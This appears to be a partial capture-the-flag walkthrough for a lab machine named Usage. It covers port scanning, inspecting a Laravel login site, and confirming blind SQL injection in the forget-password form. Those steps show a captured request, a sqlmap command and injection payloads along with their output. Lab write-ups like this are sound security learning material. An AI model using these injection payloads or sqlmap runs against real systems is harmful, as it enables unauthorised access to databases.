# MACHINE - USAGE

IP: 10.10.11.18

Type: Linux

---

## OPEN PORTS

```bash
$ nmap -sVC -T4 -Pn -p- {IP}

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## INSPECTING THE SITE

- There is a redirect to `usage.htb`
- We need to add the IP to the list of hosts in order to open the site

```bash
$ sudo -s
$ echo '{IP} usage.htb' >> /etc/hosts
```

- At this point we can correctly open the site
- As we can see it is a login page
- Using Wappalyzer we can see that it is using

1. *Laravel* as Web Framework
2. *Nginx* as web server version 1.18.0
3. *Nginx* as reverse proxy
4. *PHP* as programming language

- There are two cookies

```
laravel_session=eyJpdiI6IkFYZ1pXZWU5b3k5bkpZSXZud0xkYlE9PSIsInZhbHVlIjoiRVM4
KzRBNW1ORXFaTVF2MWE2SGtTUW9JRjdTeWNpbEpObmRSODlCRHMyYkZDckhJVGNTRFYxTGVCbWdu
ZFZtWXlJditqcXd0STREREc1cTJGL0Z3RUNhcTJuOXUwTmtld1oyTDFXS2F2MUg5N2I3MjVSRmxM
bnhVOHl2K0V6RHIiLCJtYWMiOiIxZThhMTE5YTg3ZjQ1ZWU3ZGJmOTE4MzNlZGIyZmY1ODM2Yjhl
OWZmY2I2M2YwNWVjZDNkYjA4MjFlMWE5ZTczIiwidGFnIjoiIn0%3D

XSRF-TOKEN=eyJpdiI6IkxKdGxIWWNuTGpIVENWUnQwbDgwUnc9PSIsInZhbHVlIjoiVTBTbEFIe
FQ0L2ZxMjdodWsvYisvbW53SWc1SmxkbDhQenJ4UERJTHpoS3BZMnkyVmJpOGFYZkVKSEE1U0NFe
GJrRGRtVHdOOEE5U1cwaDNvWCtOZm5GTjFyTzRLR2VLTDZxLy93VlVjUkFSU1MvTWdUb1lXUUd3T
TgrcStwaFUiLCJtYWMiOiI2YWVlNGM4MDE3NjgzZDRhNDkyZTIwMTk3OTMyMTJlYjMzOTI3OWZmY
WRiMjI5NWZmZmEwODdjOGQyNTY1ZDJjIiwidGFnIjoiIn0%3D
```

> *Cross-Site Request Forgery* (CSRF) is an attack that forces an end user to 
> execute unwanted actions on a web application in which they’re currently 
> authenticated. With a little help of social engineering (such as sending a 
> link via email or chat), an attacker may trick the users of a web application 
> into executing actions of the attacker’s choosing. If the victim is a normal 
> user, a successful CSRF attack can force the user to perform state changing 
> requests like transferring funds, changing their email address, and so forth. 
> If the victim is an administrative account, CSRF can compromise the entire 
> web application.

- Inspecting the page source code there is a 

```html
<input type="hidden" name="_token" value="hzckZuqet2rAE3zAYNiHcbhpen7JWQjk8gG9Qup9">
```

- This token along with XSRF-TOKEN are anti-forgery practice ... hence XSRF is not exploitable
- Moreover, we also see two other pages

1. `post-login`
2. `forget-password`

- Clicking on `Register` and inspecting the source page we see

1. The same token
2. a `post-registration` page used to handle post request

---

## SQL INJECTION

- There are a bunch of form for login/register/forget password
- I would like to not consider the register case
- Tried to login to see if something strange might be used ... nothing found
- Moreover, it does not shows any error or message when providing wrong credentials
- Go to the Forget-password page.
- When we try to enter a non-existent password it gives us an error
- This might seems that it is using some kind of SQL queries to check if provided email exists or not
- It is quite intuitive to try some old SQL injection techniques
- When I try to put the classical `'OR '1'='1` I don't receive any error ... It seems injectable
- Let's check it using SQLMAP
- First let's setup a Manual proxy on `localhost:8080`
- Open BurpSuite and intercept the POST request on `/forget-password`

```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6IjhNQ05BYVJUMUpqeWlNcFZ2eXRIalE9PSIsInZhbHVlI
joiUTlyM0dMdDMwbUZQMUtQblV2Z0dsVFpZLytOZndZQnduQ1Ewbk1LWExEOUhFQ080djZnb
VBNbzR6OHhpTTRVNlFoZkFITVZEU2NPckJNKzlISmJLUjBtRVVDMDJBYjNlNmgrU1Fjc2FkZ
TRMMDZCQWVOWlhHK21VOGxFMW9zZnUiLCJtYWMiOiJjODczYmZlNGM0NGU2ODk0NDU0M2FiN
GZmNDk3OThmNjFhMDg3MGEyYWUwODRlZGExMzRhM2Q1ZWUyNDYwZmM1IiwidGFnIjoiIn0%3D;
laravel_session=eyJpdiI6IndOc0xiVFBkcUZsQVYyTWxNSTB4RGc9PSIsInZhbHVlIjoiS
lZ2V2E1OXVGVjJGZzEvd1M0eFAybTVZNzBrTjdtOE1GMU4zdXgxZFFIL3FMdmVVcHRkaUZNeW
hGaHVFaHd6ZVNQUTJEdzBER280KzZOSGdKNFFKZzgra3pZZXU4ajRiNnZ2OW5XOWptRU9qWXZ
TdGtFSXpPTWJVYXhDWVdJSjMiLCJtYWMiOiJhMDA4ZWFmMWE1OTMxOWJjOTUxMGNiOWQwZTMyM
2RhYTUwZjYxM2I1NTJjMGYwMzcwZjg0NGFlZTU2NzI0YWFmIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=TZCqMUQsBNAYUzprPXJHjp1VdOQfoDa14vKfJGgP&email=email
```

- Save this request into a file named `request`

```bash
$ sqlmap -r request -p email --batch --risk 3 --level 4 --dbs
```

- The log saved into `/home/{user}/.local/share/sqlmap/output/usage.htb`

```
sqlmap identified the following injection point(s) with a total of 627 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=TZCqMUQsBNAYUzprPXJHjp1VdOQfoDa14vKfJGgP&email=email' 
             AND 7446=(SELECT (CASE WHEN (7446=7446) THEN 7446 ELSE 
             (SELECT 8947 UNION SELECT 1711) END))-- jhlC

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=TZCqMUQsBNAYUzprPXJHjp1VdOQfoDa14vKfJGgP&email=email' 
             AND 1547=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, 
             INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS 
             C WHERE 0 XOR 1)-- SzQq
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

---

## FLAGS

USER:

ROOT: 